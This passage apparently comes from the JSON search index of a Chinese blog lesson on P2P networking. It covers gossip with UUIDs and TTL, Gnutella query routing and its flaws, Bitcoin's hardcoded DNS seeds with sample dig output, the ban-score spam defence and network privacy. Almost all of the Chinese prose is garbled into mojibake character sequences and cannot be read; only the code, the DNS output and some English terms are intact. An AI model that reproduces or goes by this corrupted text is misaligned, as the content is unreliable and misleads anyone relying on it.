å‘éšæœºçš„3ä¸ªå¯¹ç­‰ä½“gossipè¿™ä¸ªæŸ¥è¯¢ã€‚è¿™äº›åŒä¼´ä¸­çš„æ¯ä¸€ä¸ªäººä¹Ÿä¼šå‘ä»–ä»¬çš„åŒä¼´ä¸­çš„éšæœº3äººgossipè¿™ä¸ªæŸ¥è¯¢ï¼Œä»¥æ­¤ç±»æ¨ã€‚ è¯·æ³¨æ„ï¼Œå¦‚æœè¿™ä¸ªè½¬å‘è¿‡ç¨‹æ— é™æœŸåœ°ç»§ç»­ä¸‹å»ï¼Œæˆ‘ä»¬å°±ä¼šæœ‰ä¸€ä¸ªé—®é¢˜ï¼šä½ çš„ä¿¡æ¯ä¼šåœ¨ç½‘ç»œä¸­æ°¸è¿œå¾ªç¯ã€‚èŠ‚ç‚¹Aä¼šå‘Bå‘é€ï¼ŒBä¼šå‘Cå‘é€ï¼ŒCä¼šå‘Aå‘é€ï¼Œä»¥æ­¤ç±»æ¨ã€‚è¿™æ˜¾ç„¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„â€“æˆ‘ä»¬éœ€è¦æŸç§å½¢å¼çš„å†…å­˜ï¼Œè¿™æ ·ä¸€ä¸ªèŠ‚ç‚¹å°±å¯ä»¥ä¸¢å¼ƒå®ƒå·²ç»çœ‹è¿‡çš„ä¿¡æ¯ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å°†ç»™æ¯ä¸ªæ¶ˆæ¯ä¸€ä¸ªUUIDã€‚é€šè¿‡ç®€å•åœ°è·Ÿè¸ªä½ å·²ç»è½¬å‘çš„UUIDï¼Œä½ å¯ä»¥å¿½ç•¥é‡å¤çš„æ¶ˆæ¯ï¼Œä»è€Œé˜²æ­¢ä»»ä½•æ— é™çš„æ¶ˆæ¯å¾ªç¯ã€‚ ä½†ä»æœ‰ä¸€ä¸ªé—®é¢˜ï¼šæ¯æ¡ä¿¡æ¯éƒ½ä¼šåœ¨P2Pç½‘ç»œä¸­ä¼ æ’­ï¼Œç›´åˆ°å®ƒå®é™…ä¸Šåˆ°è¾¾æ¯ä¸ªäººæ‰‹ä¸­ã€‚å¦‚æœä½ æƒ³è¿™æ ·åšï¼Œè¿™å¾ˆå¥½ï¼Œä½†å¯¹äºæ–‡ä»¶å…±äº«æ¥è¯´ï¼Œè¿™å°±å¤ªè¿‡åˆ†äº†ã€‚è¿™å°†è¿…é€Ÿæˆä¸ºä¸€ä¸ªå¯æ‰©å±•æ€§ç“¶é¢ˆï¼ˆæ¯ä¸ªèŠ‚ç‚¹éƒ½å¿…é¡»å¤„ç†æ•´ä¸ªç½‘ç»œä¸­çš„æ¯ä¸€ä¸ªæœç´¢ï¼‰ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ¯ä¸ªæ¶ˆæ¯ä¸Šæ·»åŠ ä¸€ä¸ªTTLï¼ˆç”Ÿå­˜æ—¶é—´ï¼‰ã€‚TTLæ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œæ¯æ¬¡è½¬å‘æ¶ˆæ¯æ—¶éƒ½ä¼šé€’å‡ï¼Œä¸€æ—¦TTLä¸º0ï¼Œæ¶ˆæ¯å°±ä¼šè¢«ä¸¢å¼ƒã€‚è¿™æ„å‘³ç€æ¯æ¡ä¿¡æ¯åœ¨æ¶ˆå¤±ä¹‹å‰åªä¼šä¼ æ’­è¿™ä¹ˆè¿œï¼Œå°±åƒä¸€ä¸ªè¡°è½çš„æ³¢æµªã€‚ æœ‰äº†è¿™äº›ä¸œè¥¿çš„å®ç°ï¼Œæˆ‘ä»¬åº”è¯¥å¾—åˆ°ä¸€äº›å¾ˆå¥½çš„ç±»ä¼¼gossipçš„æ¶ˆæ¯ä¼ æ’­ï¼Œå¹¶åœ¨ç½‘ç»œå†…è¿›è¡Œæœç´¢ã€‚ ä¸‹å›¾ä¸º TTL ä¸º 4 çš„gossipä¼ æ’­ ","date":"2022-08-23","objectID":"/p2p/:2:4","tags":["p2p","L0","Web3.0"],"title":"P2P","uri":"/p2p/"},{"categories":["Blockchain"],"content":"è·¯ç”±æŸ¥è¯¢å‘½ä¸­ ç°åœ¨è®©æˆ‘ä»¬æ¥çœ‹çœ‹å¦ä¸€é¢ï¼šå‡è®¾æˆ‘ä»¬æ”¶åˆ°ä¸€ä¸ªå…³äºmetallicaçš„æŸ¥è¯¢ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªåŒ¹é…çš„æ–‡ä»¶ã€‚æˆ‘ä»¬æƒ³ç»™ä»–ä»¬è¿”å›ä¸€ä¸ªQueryHitå“åº”ã€‚æˆ‘ä»¬åº”è¯¥å¦‚ä½•å°†å“åº”ä¼ å›ç»™åŸå‘ä»¶äººï¼Ÿ æœ€æ˜æ˜¾çš„åšæ³•æ˜¯è®©æœç´¢è€…åœ¨ä»–ä»¬çš„æŸ¥è¯¢ä¸­åŒ…æ‹¬ä»–ä»¬çš„IPï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥å“åº”ä»–ä»¬ï¼Œæœ‰ç‚¹åƒä¸€ä¸ªè¿”å›åœ°å€ã€‚è¿™æœ‰ä»€ä¹ˆé”™å‘¢ï¼Ÿ(çœŸçš„æƒ³ä¸€æƒ³å§ï¼‰ã€‚é—®é¢˜æ˜¯è¿™è®©è¢«åŠ¨çš„è§‚å¯Ÿè€…çŸ¥é“åˆ°åº•æ˜¯å“ªä¸ªIPåœ¨è¯·æ±‚å“ªä¸ªæ–‡ä»¶ã€‚è¿™å°†æ˜¯ä¸€ä¸ªå·¨å¤§çš„éšç§æ³„æ¼! æˆ‘ä»¬åº”è¯¥åŠªåŠ›åšå¾—æ›´è°¨æ…ä¸€äº›ï¼Œè€Œä¸æ˜¯ä»…ä»…å…¬å¸ƒæ¯æ¬¡æœç´¢çš„æºIPã€‚ ä¹Ÿè®¸å›åº”è€…å¯ä»¥æŠŠä»–ä»¬çš„IPè¯´å‡ºæ¥ï¼Œè¿™å°†æœ‰æœ›è®©å‘ä»¶äººçŸ¥é“åº”è¯¥è”ç³»è°ã€‚ä½†æ˜¯ï¼Œè¿™å°†ä¾µçŠ¯å“åº”è€…çš„éšç§ï¼è¿™å°†å¯¼è‡´ç½‘ç»œä¸­å‡ºç°è®¸å¤šä¸å¿…è¦çš„å™ªéŸ³ã€‚è¿™ä¹Ÿä¼šå¯¼è‡´ç½‘ç»œä¸­å‡ºç°è®¸å¤šä¸å¿…è¦çš„å™ªéŸ³ï¼Œå› ä¸ºå…¶ä»–äººéƒ½è¦å…«å¦å›å“åº”è€…çš„IPï¼Œå°½ç®¡åªæœ‰å‘é€è€…çœŸæ­£å…³å¿ƒã€‚ Gnutellaä½¿ç”¨çš„è§£å†³æ–¹æ¡ˆæ˜¯ç›¸å½“å·§å¦™çš„ï¼šé€’å½’åœ°è·¯ç”±å“åº”ã€‚ å‡è®¾ä½ æœ‰ä¸€ä¸ªæ–‡ä»¶ç¬¦åˆ â€œmetallica â€œçš„æŸ¥è¯¢ã€‚ä½ å‘è½¬å‘è¯¥ä¿¡æ¯çš„äººå‘å›ä¸€ä¸ªQueryHitå“åº”ï¼Œå¹¶æŒ‡å®šä½ æ‰€å“åº”çš„UUIDã€‚èŠ‚ç‚¹Cçœ‹åˆ°è¯¥UUIDçš„QueryHitåï¼Œä¼šå°†å…¶å‘å›ç»™è½¬å‘è¯¥æŸ¥è¯¢çš„äººï¼Œå³èŠ‚ç‚¹Bï¼Œç„¶åèŠ‚ç‚¹Bä¼šå°†å…¶å‘å›ç»™èŠ‚ç‚¹Aï¼Œå³åŸå‘ä»¶äººã€‚é€šè¿‡ç®€å•åœ°è®©æ¯ä¸ªèŠ‚ç‚¹è®°ä½è°è½¬å‘äº†ä»–ä»¬çš„æ¯ä¸ªæ¶ˆæ¯ï¼ŒQueryHitså¯ä»¥è¢«é€’å½’åœ°é€å›å‘ä»¶äººã€‚è¿™æœ€å¤§é™åº¦åœ°å‡å°‘äº†ç½‘ç»œä¸­çš„éšç§æ³„æ¼å’Œä¸å¿…è¦çš„å™ªéŸ³ã€‚ Queryå’ŒQueryHitæ¶ˆæ¯ä¹‹é—´çš„è¿™ç§åŠŸèƒ½æ˜¯Gnutellaæ–‡ä»¶å‘ç°çš„æ ¸å¿ƒã€‚ç„¶åé€šè¿‡ç›´æ¥çš„HTTPè¿æ¥è¿›è¡Œå®é™…çš„ä¸‹è½½ã€‚ æ­£å¦‚ä½ æ‰€çœ‹åˆ°çš„ï¼ŒGnutellaæ˜¯ä¸€ä¸ªä¼˜é›…ã€ç®€å•çš„æ–‡ä»¶å…±äº«åè®®ï¼Œåœ¨æ²¡æœ‰ä¸­å¿ƒæ–¹çš„æƒ…å†µä¸‹å·¥ä½œã€‚ ","date":"2022-08-23","objectID":"/p2p/:2:5","tags":["p2p","L0","Web3.0"],"title":"P2P","uri":"/p2p/"},{"categories":["Blockchain"],"content":"Gnutellaçš„ä¸€äº›é—®é¢˜ å°½ç®¡æœ‰å…¶ç‹¬åˆ›æ€§ï¼ŒGnutellaä¹Ÿæœ‰å…¶é—®é¢˜ã€‚ç¬¬ä¸€ä¸ªé—®é¢˜æ˜¯å¸¦å®½ï¼šGnutellaäº§ç”Ÿäº†å¤§é‡çš„ç½‘ç»œæµé‡ï¼Œå…¶ä¸­å¤§çº¦50%æ˜¯pingã€‚æœ‰äº›é—®é¢˜å¯ä»¥é€šè¿‡ç§¯æçš„ç¼“å­˜å’Œæ•´åˆpingä¿¡æ¯æ¥ç¼“è§£ï¼Œä½†è¯¥åè®®çš„æ—©æœŸç‰ˆæœ¬æ˜¯éå¸¸è€—è´¹å¸¦å®½çš„ã€‚ ç¬¬äºŒä¸ªé—®é¢˜æ˜¯ï¼Œ70%çš„Gnutellaç”¨æˆ·æ˜¯è‡ªç”±èŒä¸šè€…ï¼Œä»–ä»¬åªä¸‹è½½æ–‡ä»¶ï¼Œä»ä¸ä¸Šä¼ è‡ªå·±çš„æ–‡ä»¶ã€‚è¿™ä½¿å¾—ä¸‹è½½è€…å’Œä¸Šä¼ è€…ä¹‹é—´å½¢æˆäº†ä¸å¥åº·çš„å¹³è¡¡ã€‚ æœ€åï¼ŒGnutellaå®é™…ä¸Šä¸æ˜¯è¿™ç§åŸºäºgossipçš„ç½‘ç»œè®¾è®¡çš„æœ€ä½³äººé€‰ã€‚åœ¨Gnutellaä¸­ï¼Œä¸€åŠä»¥ä¸Šçš„ç½‘ç»œæ”¶åˆ°æ¯ä¸€ä¸ªæŸ¥è¯¢ã€‚è¿™å¯¹æ–‡ä»¶å…±äº«æ¥è¯´æ˜¯çŸ«æ‰è¿‡æ­£çš„ï¼Œä½ ä¸éœ€è¦é‚£ä¹ˆå¤§ä¸€éƒ¨åˆ†ç½‘ç»œæ¥æ¥æ”¶æ¯ä¸ªæ¶ˆæ¯â€“å¤§å¤šæ•°æœç´¢éƒ½æ˜¯é’ˆå¯¹å¸¸è§çš„æ–‡ä»¶ï¼Œè®¸å¤šé™„è¿‘çš„èŠ‚ç‚¹éƒ½å¯ä»¥ä¸ºä½ æœåŠ¡ã€‚ å¦ä¸€æ–¹é¢ï¼Œæ¯”ç‰¹å¸è¦æ±‚æ¯ä¸ªèŠ‚ç‚¹éƒ½çŸ¥é“æ¯ä¸ªåŒºå—ï¼Œè€Œäº¤æ˜“æ˜¯ä¸ºäº†ä¼ æ’­ç»™æ¯ä¸ªäººã€‚å¯ä»¥è¯´ï¼Œè¿™ä½¿å¾—æ¯”ç‰¹å¸æ¯”Gnutellaæ›´é€‚åˆäºåŸºäºgossipçš„åè®®ã€‚ è¿™äº›é—®é¢˜ç”±äºGnutellaçš„æ‰å¹³ç»“æ„è€Œå˜å¾—æ›´åŠ å¤æ‚ï¼Œå®ƒåœ¨ç½‘ç»œæ‹“æ‰‘ç»“æ„ä¸­æŠŠæ¯ä¸ªèŠ‚ç‚¹éƒ½è§†ä¸ºå¹³ç­‰ã€‚ä½†æ˜¯ï¼Œå½“æ¶‰åŠåˆ°å¸¦å®½æ—¶ï¼ŒèŠ‚ç‚¹å¹¶ä¸éƒ½æ˜¯å¹³ç­‰çš„â€“ä¸€äº›èŠ‚ç‚¹æ›´ç¨³å®šåœ°ä¿æŒåœ¨çº¿ï¼Œå¹¶æœ‰æ›´å¤šçš„å¸¦å®½å¯ä»¥æä¾›ã€‚å¦‚æœä¸€ä¸ªç³»ç»Ÿç»•è¿‡è„†å¼±çš„èŠ‚ç‚¹å¹¶å›´ç»•é«˜å¯é æ€§çš„èŠ‚ç‚¹è¿›è¡Œè‡ªæˆ‘ç»„ç»‡ï¼Œé‚£ä¹ˆå®ƒçš„æ€§èƒ½å°±ä¼šç«‹å³å˜å¾—æ›´å¼ºã€‚ åæ¥çš„æ–‡ä»¶å…±äº«å®¢æˆ·ç«¯ï¼Œå¦‚KaZaAæˆ–eMuleï¼Œå°†ä½¿ç”¨æ›´å¤šçš„åˆ†å±‚æ‹“æ‰‘ç»“æ„å’Œæ›´æ™ºèƒ½çš„è·¯ç”±ã€‚åœ¨è¿™äº›ç³»ç»Ÿä¸­ï¼Œè¡¨ç°è‰¯å¥½çš„èŠ‚ç‚¹æœ€ç»ˆä¼šæˆä¸º â€œè¶…çº§èŠ‚ç‚¹â€ï¼Œåœ¨ç³»ç»Ÿä¸­æ‰¿æ‹…æ›´å¤šçš„è´Ÿè½½ã€‚ç›¸å¯¹äºåƒGnutellaè¿™æ ·çš„æ‰å¹³ç»“æ„ï¼Œè¿™å¤§å¤§æé«˜äº†å®ƒä»¬çš„æ•´ä½“æ€§èƒ½ã€‚ åœ¨ä¸‹ä¸€è¯¾ä¸­ï¼Œæˆ‘ä»¬å°†çœ‹çœ‹gossipåœ¨æ¯”ç‰¹å¸æœ¬èº«ä¸­æ˜¯å¦‚ä½•è¿ä½œçš„ï¼Œæˆ‘ä»¬è¿˜å°†æŒ–æ˜éšç§åœ¨å…¶ç½‘ç»œå±‚ä¸­çš„ä½œç”¨ã€‚ ","date":"2022-08-23","objectID":"/p2p/:2:6","tags":["p2p","L0","Web3.0"],"title":"P2P","uri":"/p2p/"},{"categories":["Blockchain"],"content":"ä½œä¸š åœ¨è¿™é¡¹ä½œä¸šä¸­ï¼Œä½ å°†å®ç°ä¸€ä¸ªç®€å•çš„P2Påè®® è¿™é¡¹ä½œä¸šç›¸å½“å¤æ‚ï¼Œä½†ä¹Ÿæ˜¯å¯¹ä½ æ¨ç†P2Påè®®åœ¨å®è·µä¸­å¦‚ä½•è¿ä½œçš„èƒ½åŠ›çš„ä¸€æ¬¡å¤§è€ƒéªŒã€‚ å‰å¾€repl.itä¸Šçš„ä½œä¸šï¼ŒæŸ¥çœ‹README.mdã€‚ä¸€æ—¦ä½ è¯»å®Œå®ƒï¼Œforkå·¥ä½œåŒºï¼Œå¼€å§‹å·¥ä½œã€‚è¿™ä¸ªä»»åŠ¡æ²¡æœ‰æµ‹è¯•å¥—ä»¶ï¼›ä½ åªéœ€è¦å»ºç«‹ç³»ç»Ÿï¼Œç›´åˆ°åè®®æ­£å¸¸å·¥ä½œã€‚ ä¸€æ—¦ä½ å®Œæˆäº†ï¼ˆè€Œä¸”åªæœ‰åœ¨ä½ å®Œæˆä¹‹åï¼ï¼‰ï¼Œä½ å¯ä»¥å¯¹ç…§è§£å†³æ–¹æ¡ˆæ£€æŸ¥ä½ çš„å·¥ä½œï¼Œä½ å¯ä»¥åœ¨Github repoçš„ä¸€ä¸ªå•ç‹¬çš„åˆ†æ”¯ä¸­æ‰¾åˆ°ã€‚ä¸€æ—¦ä½ å®Œæˆäº†è¿™é¡¹ä»»åŠ¡ï¼Œä½ å°±å¯ä»¥ç»§ç»­å‰è¿›äº†ã€‚ ","date":"2022-08-23","objectID":"/p2p/:2:7","tags":["p2p","L0","Web3.0"],"title":"P2P","uri":"/p2p/"},{"categories":["Blockchain"],"content":"æ¯”ç‰¹å¸çš„P2Pç½‘ç»œ æˆ‘ä»¬å·²ç»æŠ½è±¡åœ°çœ‹äº†gossipåè®®ã€‚ç°åœ¨æ˜¯æ—¶å€™å°†è¿™äº›æŠ½è±¡æ¦‚å¿µåº”ç”¨äºæ¯”ç‰¹å¸è‡ªå·±çš„P2Pç½‘ç»œäº†ã€‚ åœ¨é«˜å±‚æ¬¡ä¸Šï¼Œå‡ ä¹æ‰€æœ‰çš„åŠ å¯†è´§å¸éƒ½ä»æ¯”ç‰¹å¸ç»§æ‰¿äº†ç›¸åŒçš„P2Pç½‘ç»œè®¾è®¡ã€‚æœ‰äº†Gnutellaä½œä¸ºèƒŒæ™¯ï¼Œä½ ç°åœ¨åº”è¯¥å®Œå…¨æœ‰èƒ½åŠ›ç†è§£æ¯”ç‰¹å¸çš„ç½‘ç»œå±‚ã€‚å®ƒä¸GnutellaçœŸçš„å¾ˆç›¸ä¼¼ï¼Œåªæ˜¯åœ¨æœ¬è¯¾ä¸­æˆ‘ä»¬ä¼šè®²åˆ°ä¸€äº›å¢å¼ºçš„éƒ¨åˆ†ã€‚ ","date":"2022-08-23","objectID":"/p2p/:3:0","tags":["p2p","L0","Web3.0"],"title":"P2P","uri":"/p2p/"},{"categories":["Blockchain"],"content":"è¿›å…¥ç½‘ç»œ åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬å·²ç»åˆ†æäº†ç¨³å®šçŠ¶æ€ä¸‹çš„gossipç½‘ç»œã€‚ä½†æ˜¯ï¼Œä¸€ä¸ªäººå®é™…ä¸Šæ˜¯å¦‚ä½•åŠ å…¥ä¸€ä¸ªå…«å¦ç½‘ç»œçš„å‘¢ï¼Ÿä½ åªæ˜¯åœ¨äº’è”ç½‘ä¸ŠéšæœºæŸ¥è¯¢èŠ‚ç‚¹ï¼Œç›´åˆ°æ‰¾åˆ°è¿è¡Œæ­£ç¡®è½¯ä»¶çš„äººå—ï¼Ÿ(è°¢å¤©è°¢åœ°ï¼Œä¸æ˜¯çš„ï¼‰ã€‚ æ¯ä¸ªP2Påè®®éƒ½éœ€è¦ä¸€ä¸ªå¼•å¯¼èŠ‚ç‚¹æ¥å¼•å¯¼ä½ è¿›å…¥ç½‘ç»œï¼Œå¹¶å¸®åŠ©ä½ åˆå§‹åŒ–ä½ çš„åŒä¼´åˆ—è¡¨ã€‚è¿™ä¸ªå¼•å¯¼èŠ‚ç‚¹æ˜¯ä½ è¿›å…¥P2Pç½‘ç»œçš„å…¥å£ï¼Œç„¶åä½ å¯ä»¥ä»è¿™é‡Œæœ‰æœºåœ°æ‰¾åˆ°æ–°çš„å¯¹ç­‰äººã€‚ å½“ç„¶ï¼Œå¼•å¯¼èŠ‚ç‚¹çš„å±é™©åœ¨äºï¼Œå¦‚æœå®ƒæ²¡æœ‰ç»è¿‡è®¤è¯ï¼Œå®ƒå¯èƒ½æ˜¯æ¶æ„çš„ï¼Œå¹¶æ‰§è¡Œä¸­é—´äººæˆ–eclipse attack(æ—¥èš€æ”»å‡»)ã€‚ åœ¨Bitcoin Coreï¼Œå³å…¸å‹çš„æ¯”ç‰¹å¸å®ç°ä¸­ï¼Œè¿™äº›å¼•å¯¼èŠ‚ç‚¹è¢«ç¡¬ç¼–ç ä¸ºå¯ä¿¡çš„DNSæœåŠ¡å™¨ï¼Œç”±æ ¸å¿ƒå¼€å‘è€…ç»´æŠ¤ã€‚ // From: https://github.com/bitcoin/bitcoin/blob/master/src/chainparams.cpp vSeeds.emplace_back(\"seed.bitcoin.sipa.be\"); // Pieter Wuille, only supports x1, x5, x9, and xd vSeeds.emplace_back(\"dnsseed.bluematt.me\"); // Matt Corallo, only supports x9 vSeeds.emplace_back(\"dnsseed.bitcoin.dashjr.org\"); // Luke Dashjr vSeeds.emplace_back(\"seed.bitcoinstats.com\"); // Christian Decker, supports x1 - xf vSeeds.emplace_back(\"seed.bitcoin.jonasschnelli.ch\"); // Jonas Schnelli, only supports x1, x5, x9, and xd vSeeds.emplace_back(\"seed.btc.petertodd.org\"); // Peter Todd, only supports x1, x5, x9, and xd vSeeds.emplace_back(\"seed.bitcoin.sprovoost.nl\"); // Sjors Provoost vSeeds.emplace_back(\"dnsseed.emzy.de\"); // Stephan Oeste ä½ å¯ä»¥é€šè¿‡UNIXå‘½ä»¤è¡Œä½¿ç”¨digå‘½ä»¤å¯¹è¿™äº›å¼•å¯¼èŠ‚ç‚¹ä¹‹ä¸€è¿›è¡ŒDNSæŸ¥è¯¢ï¼Œä»è€Œè‡ªå·±æ£€ç´¢åˆ°ä¸€ä¸ªåˆå§‹å¯¹ç­‰ä½“åˆ—è¡¨ã€‚ # dig seed.bitcoin.sipa.be 32s ; \u003c\u003c\u003e\u003e DiG 9.10.6 \u003c\u003c\u003e\u003e seed.bitcoin.sipa.be ;; global options: +cmd ;; Got answer: ;; -\u003e\u003eHEADER\u003c\u003c- opcode: QUERY, status: NOERROR, id: 47846 ;; flags: qr rd ra; QUERY: 1, ANSWER: 25, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ;; QUESTION SECTION: ;seed.bitcoin.sipa.be. IN A ;; ANSWER SECTION: seed.bitcoin.sipa.be. 4502 IN A 173.249.18.129 seed.bitcoin.sipa.be. 4502 IN A 46.6.8.230 seed.bitcoin.sipa.be. 4502 IN A 18.134.242.0 seed.bitcoin.sipa.be. 4502 IN A 52.59.216.190 seed.bitcoin.sipa.be. 4502 IN A 37.59.68.8 seed.bitcoin.sipa.be. 4502 IN A 220.133.39.61 seed.bitcoin.sipa.be. 4502 IN A 50.53.190.92 seed.bitcoin.sipa.be. 4502 IN A 135.181.109.135 seed.bitcoin.sipa.be. 4502 IN A 72.82.9.98 seed.bitcoin.sipa.be. 4502 IN A 71.204.231.91 seed.bitcoin.sipa.be. 4502 IN A 47.54.186.223 seed.bitcoin.sipa.be. 4502 IN A 3.37.231.206 seed.bitcoin.sipa.be. 4502 IN A 104.233.207.37 seed.bitcoin.sipa.be. 4502 IN A 162.250.191.222 seed.bitcoin.sipa.be. 4502 IN A 162.227.162.49 seed.bitcoin.sipa.be. 4502 IN A 136.32.173.8 seed.bitcoin.sipa.be. 4502 IN A 88.198.7.110 seed.bitcoin.sipa.be. 4502 IN A 124.176.25.123 seed.bitcoin.sipa.be. 4502 IN A 23.93.18.185 seed.bitcoin.sipa.be. 4502 IN A 85.10.206.119 seed.bitcoin.sipa.be. 4502 IN A 18.191.42.193 seed.bitcoin.sipa.be. 4502 IN A 194.118.88.162 seed.bitcoin.sipa.be. 4502 IN A 15.161.99.250 seed.bitcoin.sipa.be. 4502 IN A 168.119.104.7 seed.bitcoin.sipa.be. 4502 IN A 72.10.171.42 ;; Query time: 1834 msec ;; SERVER: fe80::5c70:17ff:fe74:3a64%19#53(fe80::5c70:17ff:fe74:3a64%19) ;; WHEN: Tue Aug 30 09:41:24 CST 2022 ;; MSG SIZE rcvd: 449 ä½œä¸ºä¸€ä¸ªæœ‰è¶£çš„å†å²ç‚¹ï¼Œç¬¬ä¸€ä¸ªç‰ˆæœ¬çš„æ¯”ç‰¹å¸é€šè¿‡IRCé¢‘é“å¯»æ‰¾å¯¹ç­‰è€…æ¥å¼•å¯¼å…¶å¯¹ç­‰è€…åå•ã€‚æ¯ä¸ªæ¯”ç‰¹å¸èŠ‚ç‚¹éƒ½æ†ç»‘äº†ä¸€ä¸ªå°çš„IRCå®¢æˆ·ç«¯ï¼Œåœ¨ç¬¬ä¸€æ¬¡å¯åŠ¨æ—¶ï¼Œå®ƒä¼šåŠ å…¥bitcoin00å’Œbitcoin99ä¹‹é—´çš„ä¸€ä¸ªéšæœºé¢‘é“ã€‚å¦‚æœå®ƒåœ¨è¿™äº›é¢‘é“ä¸­å‘ç°äº†å…¶ä»–IPï¼Œå®ƒå°±ä¼šå°è¯•è¿æ¥å®ƒä»¬ï¼Œç›´åˆ°å¡«æ»¡å®ƒçš„åˆå§‹å¯¹ç­‰ä½“åˆ—è¡¨ã€‚ åœ¨IRCæœåŠ¡å™¨ï¼ˆLFNetï¼‰å…³é—­åï¼Œè¿™ç§å½¢å¼çš„å¼•å¯¼æœ€ç»ˆè¢«æ”¾å¼ƒäº†ï¼Œè¿™ä½¿æ¯”ç‰¹å¸çš„å¯¹ç­‰ä½“å‘ç°ç¨‹åºæš‚æ—¶å¤±æ•ˆã€‚ä»é‚£æ—¶èµ·ï¼Œæ¯”ç‰¹å¸ä¸€ç›´ä¾èµ–è¿™ä¸ªåŸºäºDNSçš„ç³»ç»Ÿæ¥å¼•å¯¼ã€‚ æœ€åˆçš„å¯¹ç­‰ä½“å‘ç°æ˜¯æ‰€æœ‰P2Pç½‘ç»œçš„ä¸€ä¸ªå›ºæœ‰çš„é˜»å¡ç‚¹ã€‚ä½†åœ¨è¿™ä¸ªé˜¶æ®µä¹‹åï¼Œä¸€ä¸ªèŠ‚ç‚¹å¯ä»¥è‡ªç”±åœ°ç”¨å®ƒé€‰æ‹©çš„ä»»ä½•å¯¹ç­‰ä½“æ¥å¡«å……å®ƒçš„å¯¹ç­‰ä½“è¡¨ã€‚ ","date":"2022-08-23","objectID":"/p2p/:3:1","tags":["p2p","L0","Web3.0"],"title":"P2P","uri":"/p2p/"},{"categories":["Blockchain"],"content":"æ¯”ç‰¹å¸çš„åƒåœ¾ä¿¡æ¯ä¿æŠ¤ ä½ ä¼šè®°å¾—ï¼ŒP2Påè®®çš„ä¸€ä¸ªå¼±ç‚¹æ˜¯è´¨é‡æ§åˆ¶ã€‚ä½ å¦‚ä½•é˜»æ­¢åçš„è¡Œä¸ºè€…æŠŠç½‘ç»œä¸Šçš„åƒåœ¾ä¿¡æ¯ææ­»ï¼Ÿæˆ‘ä»¬æ—©äº›æ—¶å€™å¯¹è¿™ä¸ªé—®é¢˜åšäº†æ‰‹è„šã€‚åŸæ¥ï¼Œæ¯”ç‰¹å¸ä½¿ç”¨ä¸€ä¸ªä¿¡èª‰ç³»ç»Ÿæ¥å¤„ç†è¿™ä¸ªé—®é¢˜ï¼Œç”±Gavin Andresenåœ¨2011å¹´å®æ–½ã€‚ å‡è®¾ä½ æ˜¯ä¸€ä¸ªæ¯”ç‰¹å¸èŠ‚ç‚¹ï¼Œä½ åˆšåˆšå¯åŠ¨äº†ä½ çš„peeråˆ—è¡¨ã€‚ä½ å¼€å§‹ç»™ä½ çš„æ¯ä¸ªå¯¹ç­‰äººåˆ†é…ä¸€ä¸ª0åˆ†çš„åƒåœ¾ä¿¡æ¯ã€‚æƒ³æƒ³çœ‹ï¼Œè¿™å°±åƒä¸€ä¸ªP2PçŠ¯ç½ªè®°å½•â€“åœ¨æ²¡æœ‰ä¸­å¤®å¸æ³•ç³»ç»Ÿçš„æƒ…å†µä¸‹ï¼Œç½‘ç»œä¸­çš„æ¯ä¸ªäººéƒ½å¿…é¡»å¯¹å…¶ä»–äººçš„è¡Œä¸ºä¿æŒè­¦æƒ•ã€‚ å°çš„è¿è§„è¡Œä¸ºï¼Œå¦‚åœ¨åˆå§‹æ¡æ‰‹æ—¶æ²¡æœ‰å‘é€ç‰ˆæœ¬ä¿¡æ¯ï¼Œå°†ä½¿ä½ çš„åˆ†æ•°å¢åŠ 1åˆ†ã€‚æ›´ä¸¥é‡çš„DoSä¼å›¾ï¼Œå¦‚åœ¨INVï¼ˆinventoryï¼‰æ¶ˆæ¯ä¸­å‘é€è¶…è¿‡50,000ä¸ªIDï¼Œå°†ä½¿ä½ è¢«æ‰£20åˆ†ã€‚ ä¸€æ—¦ä¸€ä¸ªpeerç§¯ç´¯äº†100åˆ†ï¼Œä½ çš„å®¢æˆ·ç«¯å°±ä¼šè‡ªåŠ¨å¯¹ä»–ä»¬è¿›è¡Œ24å°æ—¶çš„å½±å­ç¦è¨€(shadowbans)ï¼Œå¹¶åœæ­¢å¯¹ä»–ä»¬çš„gossipã€‚è¿™äº›åƒåœ¾ä¿¡æ¯çš„åˆ†æ•°å®é™…ä¸Šæ²¡æœ‰åœ¨åè®®ä¸­è·¨å¯¹ç­‰ä½“ä¼ æ’­ã€‚(ä¸ºä»€ä¹ˆä½ è®¤ä¸ºå®ƒä»¬ä¸æ˜¯å‘¢ï¼Ÿ)ä½†å³ä½¿å¦‚æ­¤ï¼Œè¿™ä¸ªç³»ç»Ÿä¹Ÿæ˜¯å¯¹è¡Œä¸ºä¸ç«¯çš„èŠ‚ç‚¹çš„ä¸€ç§é€‚å½“çš„é˜²å¾¡ã€‚ ","date":"2022-08-23","objectID":"/p2p/:3:2","tags":["p2p","L0","Web3.0"],"title":"P2P","uri":"/p2p/"},{"categories":["Blockchain"],"content":"ç½‘ç»œå±‚é¢çš„éšç§ P2Pç½‘ç»œæœ‰å…¶å†…åœ¨çš„éšç§æƒè¡¡ã€‚æƒ³ä¸€æƒ³ï¼šç½‘ç»œä¸­çš„æ¯æ¡ä¿¡æ¯éƒ½æ˜¯å…¬å¼€å–Šå‡ºæ¥çš„ï¼Œä»»ä½•äººéƒ½å¯ä»¥è‡ªç”±åœ°è§‚å¯Ÿæ‰€æœ‰ç»è¿‡çš„ä¿¡æ¯ã€‚å¯¹äºåƒæ¯”ç‰¹å¸è¿™æ ·çš„é‡‘èç½‘ç»œï¼Œè¿™ç§ç¼ºä¹éšç§çš„æƒ…å†µå¹¶ä¸ç†æƒ³ã€‚ 